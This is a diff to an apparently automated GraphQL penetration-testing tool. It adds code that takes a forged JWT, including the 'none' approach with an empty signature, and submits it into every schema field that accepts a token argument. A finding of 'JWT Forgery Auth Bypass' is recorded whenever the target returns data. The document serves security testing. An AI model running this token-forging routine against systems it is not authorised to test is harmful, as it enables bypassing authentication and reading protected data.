@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import json
 import re
 from datetime import datetime, timezone
 
@@ -57,19 +58,91 @@ def handle_visit(ctx: ActionContext, args: dict) -> Result:
     return Result(observation=obs, touched_target=True, is_dead=is_dead(status))
 
 
+def _autotest_token_sinks(ctx: ActionContext, token: str, approach: str) -> list[str]:
+    """Submit the forged `token` into every schema field that takes a token/jwt/auth arg, filling
+    the field's other args with scalar defaults, and record an auth-bypass finding when the field
+    returns data. Doing it here removes the fragile step of the model hand-copying a 3-segment JWT
+    (which repeatedly dropped the empty-signature segment -> 'Not enough segments').
+    """
+    from ..coverage import token_arg_fields
+    from ..schema import _minimal_selection
+
+    sm = ctx.schema_map
+    mroot = sm.get("_mutation_type", "Mutation")
+    lines: list[str] = []
+    for sink in token_arg_fields(sm, cap=6):
+        m = re.match(r"(\w+)\((\w+)\)", sink)
+        if not m:
+            continue
+        field, targ = m.group(1), m.group(2)
+        root = next((r for r in (sm.get("_query_type", "Query"), mroot)
+                     if isinstance(sm.get(r), dict) and field in sm[r]), None)
+        if root is None:
+            continue
+        info = sm[root].get(field) or {}
+        parts: list[str] = []
+        skip = False
+        for a in info.get("args") or []:
+            nm = str(a.get("name", ""))
+            typ = str(a.get("type") or "")
+            base = re.sub(r"[\[\]!]", "", typ).strip()
+            if nm == targ:
+                parts.append(f"{nm}: {json.dumps(token)}")
+            elif base in ("Int", "Float", "Boolean", "String", "ID") and "[" not in typ:
+                parts.append(f"{nm}: " + {"Int": "1", "Float": "1.0", "Boolean": "true"}.get(base, '"1"'))
+            elif typ.endswith("!"):
+                skip = True
+                break
+        if skip:
+            lines.append(f"{field}({targ}) -> skipped (needs a complex arg)")
+            continue
+        sel = _minimal_selection(sm, info.get("return_type", ""))
+        op = "mutation" if root == mroot else "query"
+        query = f"{op} {{ {field}({', '.join(parts)}) {sel} }}".strip()
+        try:
+            resp = ctx.client.execute(query, None, extra_headers=ctx.identity or None)
+        except Exception as e:  # noqa: BLE001
+            lines.append(f"{field}({targ}) -> request error: {str(e)[:50]}")
+            continue
+        ctx.trace_io(query, {}, resp, label=f"forge_jwt:autotest:{field}")
+        data = resp.get("data") if isinstance(resp.get("data"), dict) else {}
+        val = data.get(field) if isinstance(data, dict) else None
+        errtext = json.dumps(resp.get("errors") or [], default=str)[:200].lower()
+        if val not in (None, [], {}, ""):
+            ctx.record(f"JWT Forgery Auth Bypass ({approach}) - forged token accepted by {field}({targ})",
+                       f"{field}({targ})",
+                       f"forged {approach} token accepted; {field} returned data: "
+                       f"{json.dumps(val, default=str)[:150]}", 4.0)
+            lines.append(f"{field}({targ}) -> ACCEPTED, returned data - AUTH BYPASS (recorded)")
+        elif any(k in errtext for k in ("segment", "signature", "invalid token", "decode", "expired", "malformed")):
+            lines.append(f"{field}({targ}) -> rejected ({errtext[:60].strip() or 'error'})")
+        else:
+            lines.append(f"{field}({targ}) -> not rejected but returned no data - forge with a VALID identity "
+                         f"claim (seed a real token via login/createUser, then re-forge)")
+    return lines
+
+
 @action("forge_jwt")
 def handle_forge_jwt(ctx: ActionContext, args: dict) -> Result:
     try:
-        token = tool_forge_jwt(str(args.get("approach", "none")), args.get("secret"),
+        approach = str(args.get("approach", "none"))
+        token = tool_forge_jwt(approach, args.get("secret"),
                                args.get("claims") if isinstance(args.get("claims"), dict) else None,
                                ctx.harvested)
         ctx.harvested.setdefault("forged_jwt", []).append(token)
-        obs = (f"forged token (adopt via set_identity, e.g. "
-               f"{{\"Authorization\":\"Bearer {token[:18]}…\"}}): {token}")
+        tested = _autotest_token_sinks(ctx, token, approach)
+        obs = f"forged token: {token}"
+        if tested:
+            obs += ("\n  auto-tested against the field's token arg (no need to re-send by hand):\n    "
+                    + "\n    ".join(tested)
+                    + "\n  Also adopt via set_identity {\"Authorization\": \"Bearer <token>\"} to test the header path.")
+        else:
+            obs += ("\n  no schema field takes a token/jwt/auth arg - adopt via set_identity "
+                    "{\"Authorization\": \"Bearer <token>\"} to test header-based acceptance.")
     except Exception as e:  # noqa: BLE001
         obs = f"forge_jwt failed: {str(e)[:120]}"
     ctx.log(f"[{ctx.step}] forge_jwt -> {obs[:200]}")
-    return Result(observation=obs)
+    return Result(observation=obs, touched_target=True)
 
 
 @action("oob_url")
